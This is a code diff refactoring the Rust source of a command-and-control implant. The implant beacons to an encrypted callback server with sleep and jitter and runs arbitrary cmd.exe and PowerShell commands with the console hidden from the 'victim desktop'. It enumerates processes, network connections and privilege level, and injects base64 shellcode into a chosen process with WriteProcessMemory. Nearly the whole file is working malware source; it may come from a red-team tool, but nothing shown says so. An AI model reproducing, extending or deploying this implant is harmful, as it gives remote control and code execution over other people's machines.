@@ -1,10 +1,10 @@
 use link_common::{
-    build_client, decrypt_config, derive_key, CallbackRequest, RegisterRequest, TaskResponse,
+    build_client, decrypt_config, derive_key, dispatch::dispatch_common, get_jitter_percent,
+    get_sleep_seconds, should_exit, sleep, sleep_with_jitter, CallbackRequest, RegisterRequest,
+    TaskResponse,
 };
 use std::env;
-use std::net::UdpSocket;
 use std::process::Command;
-use std::sync::atomic::{AtomicI64, AtomicU32, AtomicU64, Ordering};
 
 const CALLBACK: &str = env!("CALLBACK");
 
@@ -23,7 +23,7 @@ fn hostname() -> String {
 }
 
 fn local_ip() -> String {
-    UdpSocket::bind("0.0.0.0:0")
+    std::net::UdpSocket::bind("0.0.0.0:0")
         .ok()
         .and_then(|s| s.connect("8.8.8.8:80").ok().map(|_| s))
         .and_then(|s| s.local_addr().ok())
@@ -31,60 +31,9 @@ fn local_ip() -> String {
         .unwrap_or_else(|| "unknown".into())
 }
 
-// ── Sleep configuration ───────────────────────────────────────────────────────
-
-static SLEEP_SECONDS: AtomicU64 = AtomicU64::new(5);
-static JITTER_PERCENT: AtomicU32 = AtomicU32::new(0);
-
-fn get_sleep_seconds() -> u64 {
-    SLEEP_SECONDS.load(Ordering::Relaxed)
-}
-
-fn get_jitter_percent() -> u32 {
-    JITTER_PERCENT.load(Ordering::Relaxed)
-}
-
-fn set_sleep_seconds(seconds: u64) {
-    SLEEP_SECONDS.store(seconds, Ordering::Relaxed);
-}
-
-fn set_jitter_percent(percent: u32) {
-    JITTER_PERCENT.store(percent.min(100), Ordering::Relaxed);
-}
-
-// ── Kill date configuration ────────────────────────────────────────────────
-
-/// `i64::MIN` is used as a sentinel meaning "no kill date set".
-static KILL_DATE: AtomicI64 = AtomicI64::new(i64::MIN);
-
-fn get_kill_date() -> Option<i64> {
-    let v = KILL_DATE.load(Ordering::Relaxed);
-    if v == i64::MIN {
-        None
-    } else {
-        Some(v)
-    }
-}
-
-fn set_kill_date(timestamp: Option<i64>) {
-    KILL_DATE.store(timestamp.unwrap_or(i64::MIN), Ordering::Relaxed);
-}
-
-fn should_exit() -> bool {
-    if let Some(kill_date) = get_kill_date() {
-        if let Ok(now) = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH) {
-            if now.as_secs() as i64 > kill_date {
-                return true;
-            }
-        }
-    }
-    false
-}
-
 // ── Main C2 loop ─────────────────────────────────────────────────────────────
 
 pub fn link_loop() {
-    // Decrypt the callback address
     let encryption_key = derive_key("linky-secret-key", "callback-salt");
     let decrypted_callback =
         decrypt_config(CALLBACK, &encryption_key).unwrap_or_else(|| CALLBACK.to_string());
@@ -97,11 +46,9 @@ pub fn link_loop() {
         if client.get(format!("{}/js", base)).send().is_ok() {
             break;
         }
-        // Check if we should exit due to kill date
         if should_exit() {
             return;
         }
-
         sleep_with_jitter(get_sleep_seconds(), get_jitter_percent());
     }
 
@@ -133,6 +80,10 @@ pub fn link_loop() {
     let mut prev_task_id = String::new();
 
     loop {
+        if should_exit() {
+            break;
+        }
+
         let cb = CallbackRequest {
             q: &prev_output,
             tasking: &prev_task_id,
@@ -179,33 +130,17 @@ pub fn link_loop() {
 // ── Command dispatch ─────────────────────────────────────────────────────────
 
 fn dispatch(raw: &str) -> String {
-    let (cmd, args) = split_first(raw);
+    if let Some(output) = dispatch_common(raw) {
+        return output;
+    }
+    let (cmd, args) = link_common::split_first(raw);
     match cmd {
-        "cd" => env::set_current_dir(args)
-            .map(|_| String::new())
-            .unwrap_or_else(|e| format!("[-] {}", e)),
-
-        "pwd" => env::current_dir()
-            .map(|p| p.display().to_string())
-            .unwrap_or_else(|e| format!("[-] {}", e)),
-
-        "ls" => list_dir(if args.is_empty() { "." } else { args }),
-
-        "pid" => std::process::id().to_string(),
-
         "whoami" => format!("{}\\{}", hostname(), username()),
-
         "info" => collect_system_info(),
         "ps" => list_processes(),
         "netstat" => list_network_connections(),
-        "sleep" => handle_sleep_command(args),
-        "killdate" => handle_killdate_command(args),
-
         "integrity" => integrity_level(),
-
         "inject" => inject_cmd(args),
-        "download" => download_file(args),
-        "upload" => upload_file(args),
 
         // cmd /C … wrapper sent by the server
         _ if raw.starts_with("cmd /C ") || raw.starts_with("cmd.exe /C ") => {
@@ -220,17 +155,20 @@ fn dispatch(raw: &str) -> String {
             shell_exec("powershell.exe", &["-noP", "-sta", "-w", "1", "-c", args])
         }
 
-        // fallback: send through cmd.exe
+        "shell" => shell_exec("cmd.exe", &["/C", args]),
+
         _ => shell_exec("cmd.exe", &["/C", raw]),
     }
 }
 
-/// Run a subprocess, suppressing the console window on Windows.
+// ── Process execution ─────────────────────────────────────────────────────────
+
+/// Run a subprocess with CREATE_NO_WINDOW on Windows (no console popup).
 fn shell_exec(prog: &str, args: &[&str]) -> String {
     let mut cmd = Command::new(prog);
     cmd.args(args);
 
-    // CREATE_NO_WINDOW (0x08000000) – Windows-only extension trait
+    // SAFETY: CREATE_NO_WINDOW (0x08000000) is a standard Win32 flag.
     #[cfg(target_os = "windows")]
     {
         use std::os::windows::process::CommandExt;
@@ -250,22 +188,100 @@ fn shell_exec(prog: &str, args: &[&str]) -> String {
     }
 }
 
-fn list_dir(path: &str) -> String {
-    match std::fs::read_dir(path) {
-        Ok(entries) => entries
-            .flatten()
-            .map(|e| {
-                let name = e.file_name().to_string_lossy().into_owned();
-                if e.file_type().map(|t| t.is_dir()).unwrap_or(false) {
-                    format!("<DIR>  {}", name)
-                } else {
-                    format!("       {}", name)
-                }
-            })
-            .collect::<Vec<_>>()
-            .join("\n"),
-        Err(e) => format!("[-] {}", e),
+/// Build a Command that suppresses the console window on Windows.
+/// Used for built-in Windows tools (tasklist, netstat) that would otherwise
+/// spawn a visible console on the victim's desktop.
+fn silent_command(prog: &str, args: &[&str]) -> Command {
+    let mut cmd = Command::new(prog);
+    cmd.args(args);
+    // SAFETY: CREATE_NO_WINDOW (0x08000000) prevents a console window from
+    // appearing on the victim desktop — identical to the flag used in shell_exec().
+    #[cfg(target_os = "windows")]
+    {
+        use std::os::windows::process::CommandExt;
+        cmd.creation_flags(0x0800_0000);
     }
+    cmd
+}
+
+// ── System information ────────────────────────────────────────────────────────
+
+fn collect_system_info() -> String {
+    let mut info = Vec::new();
+
+    info.push(format!("OS Version: {}", env::consts::OS));
+    info.push(format!("Architecture: {}", env::consts::ARCH));
+    info.push(format!("User: {}\\{}", hostname(), username()));
+    info.push("Network: Multiple interfaces (use ipconfig for details)".to_string());
+    info.push("RAM: Use Task Manager for detailed memory info".to_string());
+    info.push(format!("CPU Cores: {}", num_cpus::get()));
+
+    let mut uptime_cmd = silent_command(
+        "powershell.exe",
+        &[
+            "-noP",
+            "-sta",
+            "-w",
+            "1",
+            "-c",
+            "(Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime \
+                | Select-Object -ExpandProperty TotalSeconds",
+        ],
+    );
+    if let Ok(out) = uptime_cmd.output() {
+        if let Ok(s) = String::from_utf8(out.stdout) {
+            if let Ok(secs) = s.trim().parse::<f64>() {
+                let h = (secs / 3600.0) as u64;
+                let m = ((secs % 3600.0) / 60.0) as u64;
+                info.push(format!("Uptime: {}h {}m", h, m));
+            }
+        }
+    }
+
+    info.push(format!("Process ID: {}", std::process::id()));
+
+    if let Ok(cwd) = std::env::current_dir() {
+        info.push(format!("Working Directory: {}", cwd.display()));
+    }
+
+    info.push(format!(
+        "Environment Variables: {}",
+        std::env::vars().count()
+    ));
+
+    info.join("\n")
+}
+
+fn list_processes() -> String {
+    // Use silent_command so tasklist does not spawn a visible console window.
+    let output = match silent_command("tasklist", &["/FO", "CSV", "/NH"]).output() {
+        Ok(o) => o,
+        Err(e) => return format!("[-] Failed to execute tasklist: {}", e),
+    };
+
+    if !output.status.success() {
+        return "[-] tasklist command failed".to_string();
+    }
+
+    let output_str = String::from_utf8_lossy(&output.stdout);
+    format!(
+        "PID\tPPID\tUSER\t\tCOMMAND\n{}",
+        output_str.replace(',', "\t")
+    )
+}
+
+fn list_network_connections() -> String {
+    // Use silent_command so netstat does not spawn a visible console window.
+    let output = match silent_command("netstat", &["-ano"]).output() {
+        Ok(o) => o,
+        Err(e) => return format!("[-] Failed to execute netstat: {}", e),
+    };
+
+    if !output.status.success() {
+        return "[-] netstat command failed".to_string();
+    }
+
+    String::from_utf8_lossy(&output.stdout).into_owned()
 }
 
 // ── Token integrity level (Windows only) ────────────────────────────────────
@@ -279,13 +295,14 @@ fn integrity_level() -> String {
     const HIGH: u32 = 0x3000;
     const SYSTEM: u32 = 0x4000;
 
+    // SAFETY: All Win32 handles are checked for validity before use and
+    // closed via CloseHandle before returning.
     unsafe {
         let mut token = HANDLE::default();
         if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token).is_err() {
             return "unknown".into();
         }
 
-        // First call: get required buffer size
         let mut size: u32 = 0;
         let _ = GetTokenInformation(token, TokenIntegrityLevel, None, 0, &mut size);
         let mut buf = vec![0u8; size as usize];
@@ -304,11 +321,9 @@ fn integrity_level() -> String {
         }
         let _ = CloseHandle(token);
 
-        // Interpret the buffer as TOKEN_MANDATORY_LABEL
         let label = &*(buf.as_ptr() as *const TOKEN_MANDATORY_LABEL);
         let sid = label.Label.Sid;
         let count = *GetSidSubAuthorityCount(sid) as isize;
-        // SubAuthority is declared as [DWORD; 1] but is a variable-length tail
         let rid = *GetSidSubAuthority(sid, count as u32 - 1);
 
         match rid {
@@ -330,7 +345,7 @@ fn integrity_level() -> String {
 // ── Process injection (Windows only) ────────────────────────────────────────
 
 fn inject_cmd(args: &str) -> String {
-    let (pid_str, b64) = split_first(args);
+    let (pid_str, b64) = link_common::split_first(args);
     if b64.is_empty() {
         return "Usage: inject <pid> <base64_shellcode>".into();
     }
@@ -350,6 +365,7 @@ fn inject_shellcode(pid: u32, shellcode: &[u8]) -> String {
     use winapi::um::memoryapi::WriteProcessMemory;
     use windows::{Win32::Foundation::*, Win32::System::Memory::*, Win32::System::Threading::*};
 
+    // SAFETY: Win32 process injection — handles are validated and closed after use.
     unsafe {
         let proc = match OpenProcess(PROCESS_ALL_ACCESS, false, pid) {
             Ok(handle) => handle,
@@ -416,275 +432,4 @@ fn inject_shellcode(pid: u32, shellcode: &[u8]) -> String {
         pid,
         shellcode.len()
     )
-}
-
-fn download_file(path: &str) -> String {
-    use base64::{engine::general_purpose::STANDARD, Engine as _};
-    if path.is_empty() {
-        return "[-] Usage: download <file_path>".to_string();
-    }
-    match std::fs::read(path) {
-        Ok(buf) => format!("FILE:{}:{}", path, STANDARD.encode(&buf)),
-        Err(e) => format!("[-] Failed to read file: {}", e),
-    }
-}
-
-fn upload_file(args: &str) -> String {
-    use base64::{engine::general_purpose::STANDARD, Engine as _};
-    if args.is_empty() {
-        return "[-] Usage: upload <base64_content> <destination_path>".to_string();
-    }
-
-    let (content, path) = match args.find(' ') {
-        Some(i) => (&args[..i], args[i + 1..].trim_start()),
-        None => return "[-] Invalid upload command format".to_string(),
-    };
-
-    let decoded = match STANDARD.decode(content) {
-        Ok(data) => data,
-        Err(e) => return format!("[-] Failed to decode base64: {}", e),
-    };
-
-    match std::fs::write(path, &decoded) {
-        Ok(()) => format!("[+] File uploaded successfully: {}", path),
-        Err(e) => format!("[-] Failed to write file: {}", e),
-    }
-}
-
-fn collect_system_info() -> String {
-    let mut info = Vec::new();
-
-    // OS version
-    info.push(format!("OS Version: {}", env::consts::OS));
-
-    // Architecture
-    info.push(format!("Architecture: {}", env::consts::ARCH));
-
-    // Current user and hostname
-    info.push(format!("User: {}\\{}", hostname(), username()));
-
-    // Network interfaces - simplified for Windows
-    info.push("Network: Multiple interfaces (use ipconfig for details)".to_string());
-
-    // Memory info - simplified
-    info.push("RAM: Use Task Manager for detailed memory info".to_string());
-
-    // CPU info
-    info.push(format!("CPU Cores: {}", num_cpus::get()));
-
-    // Uptime via PowerShell (fiable sur toutes versions Windows)
-    let mut uptime_cmd = Command::new("powershell.exe");
-    uptime_cmd.args([
-        "-noP",
-        "-sta",
-        "-w",
-        "1",
-        "-c",
-        "(Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime \
-                | Select-Object -ExpandProperty TotalSeconds",
-    ]);
-    #[cfg(target_os = "windows")]
-    {
-        use std::os::windows::process::CommandExt;
-        uptime_cmd.creation_flags(0x0800_0000); // CREATE_NO_WINDOW
-    }
-    let uptime_out = uptime_cmd.output();
-    if let Ok(out) = uptime_out {
-        if let Ok(s) = String::from_utf8(out.stdout) {
-            if let Ok(secs) = s.trim().parse::<f64>() {
-                let h = (secs / 3600.0) as u64;
-                let m = ((secs % 3600.0) / 60.0) as u64;
-                info.push(format!("Uptime: {}h {}m", h, m));
-            }
-        }
-    }
-
-    // Current process info
-    info.push(format!("Process ID: {}", std::process::id()));
-
-    // Current working directory
-    if let Ok(cwd) = std::env::current_dir() {
-        info.push(format!("Working Directory: {}", cwd.display()));
-    }
-
-    // Environment variables count
-    info.push(format!(
-        "Environment Variables: {}",
-        std::env::vars().count()
-    ));
-
-    info.join("\n")
-}
-
-fn list_processes() -> String {
-    use std::process::Command;
-
-    // On Windows, we'll use tasklist command for simplicity
-    // In a real implementation, you would use Windows API
-    let output = match Command::new("tasklist")
-        .arg("/FO")
-        .arg("CSV")
-        .arg("/NH")
-        .output()
-    {
-        Ok(output) => output,
-        Err(e) => return format!("[-] Failed to execute tasklist: {}", e),
-    };
-
-    if !output.status.success() {
-        return "[-] tasklist command failed".to_string();
-    }
-
-    let output_str = String::from_utf8_lossy(&output.stdout);
-    format!(
-        "PID\tPPID\tUSER\t\tCOMMAND\n{}",
-        output_str.replace(",", "\t")
-    )
-}
-
-fn list_network_connections() -> String {
-    use std::process::Command;
-
-    // On Windows, we'll use netstat command for simplicity
-    // In a real implementation, you would use Windows API
-    let output = match Command::new("netstat").arg("-ano").output() {
-        Ok(output) => output,
-        Err(e) => return format!("[-] Failed to execute netstat: {}", e),
-    };
-
-    if !output.status.success() {
-        return "[-] netstat command failed".to_string();
-    }
-
-    String::from_utf8_lossy(&output.stdout).into_owned()
-}
-
-// ── Encrypted configuration ────────────────────────────────────────────────
-
-// ── Helpers ──────────────────────────────────────────────────────────────────
-
-fn split_first(s: &str) -> (&str, &str) {
-    s.find(' ')
-        .map(|i| (&s[..i], s[i + 1..].trim_start()))
-        .unwrap_or((s, ""))
-}
-
-fn sleep(secs: u64) {
-    std::thread::sleep(std::time::Duration::from_secs(secs));
-}
-
-fn sleep_with_jitter(base_seconds: u64, jitter_percent: u32) {
-    use rand::Rng;
-
-    if jitter_percent == 0 {
-        // No jitter, just sleep the base time
-        sleep(base_seconds);
-    } else {
-        // Calculate jitter range (±jitter_percent%)
-        let jitter_range = (base_seconds as f64 * jitter_percent as f64 / 100.0) as i64;
-        let mut rng = rand::thread_rng();
-        let jitter = rng.gen_range(-jitter_range..=jitter_range);
-
-        // Ensure we don't sleep for negative time
-        let sleep_time = if jitter.is_negative() {
-            base_seconds.saturating_sub(jitter.unsigned_abs())
-        } else {
-            base_seconds.saturating_add(jitter as u64)
-        };
-
-        // Sleep for at least 1 second
-        let final_sleep = sleep_time.max(1);
-        sleep(final_sleep);
-    }
-}
-
-fn handle_sleep_command(args: &str) -> String {
-    if args.is_empty() {
-        return format!(
-            "Current sleep: {} seconds, jitter: {}%",
-            get_sleep_seconds(),
-            get_jitter_percent()
-        );
-    }
-
-    // Parse arguments
-    let parts: Vec<&str> = args.split_whitespace().collect();
-
-    if !parts.is_empty() {
-        if let Ok(new_sleep) = parts[0].parse::<u64>() {
-            set_sleep_seconds(new_sleep);
-
-            if parts.len() > 1 {
-                if let Ok(new_jitter) = parts[1].parse::<u32>() {
-                    set_jitter_percent(new_jitter);
-                    return format!(
-                        "[+] Sleep updated: {} seconds, jitter: {}%",
-                        get_sleep_seconds(),
-                        get_jitter_percent()
-                    );
-                }
-            }
-
-            return format!("[+] Sleep updated: {} seconds", get_sleep_seconds());
-        }
-    }
-
-    "[-] Usage: sleep <seconds> [jitter_percent]".to_string()
-}
-
-fn handle_killdate_command(args: &str) -> String {
-    if args.is_empty() {
-        match get_kill_date() {
-            Some(timestamp) => {
-                // Convert timestamp to readable date
-                if let Some(date_time) =
-                    chrono::DateTime::<chrono::Utc>::from_timestamp_secs(timestamp)
-                {
-                    format!(
-                        "Current kill date: {}",
-                        date_time.format("%Y-%m-%d %H:%M:%S")
-                    )
-                } else {
-                    format!("Current kill date: {} (invalid timestamp)", timestamp)
-                }
-            }
-            None => "No kill date set".to_string(),
-        }
-    } else if args.to_lowercase() == "clear" {
-        set_kill_date(None);
-        "[+] Kill date cleared".to_string()
-    } else {
-        // Parse date in format YYYY-MM-DD or timestamp
-        if let Ok(timestamp) = args.parse::<i64>() {
-            set_kill_date(Some(timestamp));
-            if let Some(date_time) = chrono::DateTime::<chrono::Utc>::from_timestamp_secs(timestamp)
-            {
-                format!(
-                    "[+] Kill date set to: {}",
-                    date_time.format("%Y-%m-%d %H:%M:%S")
-                )
-            } else {
-                format!("[+] Kill date set to timestamp: {}", timestamp)
-            }
-        } else {
-            // Try to parse as date string
-            let formats = [
-                "%Y-%m-%d",
-                "%Y-%m-%d %H:%M:%S",
-                "%Y/%m/%d",
-                "%Y/%m/%d %H:%M:%S",
-            ];
-            for format in formats {
-                if let Ok(parsed_date) = chrono::NaiveDateTime::parse_from_str(args, format) {
-                    let timestamp = parsed_date.and_utc().timestamp();
-                    set_kill_date(Some(timestamp));
-                    return format!(
-                        "[+] Kill date set to: {}",
-                        parsed_date.format("%Y-%m-%d %H:%M:%S")
-                    );
-                }
-            }
-            "[-] Usage: killdate [timestamp|YYYY-MM-DD|clear]".to_string()
-        }
-    }
 }
